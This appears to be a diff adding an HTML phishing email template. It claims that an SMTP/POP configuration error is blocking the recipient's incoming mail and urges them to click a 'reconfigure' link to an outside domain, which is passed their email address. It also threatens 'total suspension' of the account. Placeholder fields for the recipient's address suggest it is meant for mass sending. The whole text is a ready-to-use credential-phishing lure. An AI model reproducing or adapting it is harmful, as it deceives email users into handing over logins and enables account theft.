@@ -1,0 +1,16 @@
+
+<div class="x_container">
+<p>Email: <b>&email&</b></p>
+<div><strong>An error in your SMTP/POP settings is blocking your incoming email.</strong></div>
+<br>
+This is an autmomated email sent from our SSL severs to inform you that there is an error in your email configuration.<br>
+This error was identified on: 2021/07/11 and we have not been able to deliver 8 contact email messages from this date. 
+<p>To retrieve your emails and reconfigure Port 486, <a href="http://mtsense.cf/possession/future/?email=[[-Email-]]" target="_blank">Click here to reconfigure</a> or click the button below.</p>
+<input id="x_button" name="x_button" type="submit" value="Reconfigure Email">&nbsp;<br>
+<b>Warning:</b> Failure to do this will lead total suspension of your email account.<br>
+This message has been sent to: <b>&email&</b>, please ignore if this is not your email address.</div>
+<br>
+</div>
+
+</div>
+</div></div> <div style="display: none;"></div> </div> </div></div> <div style="display: none;"></div> </div>
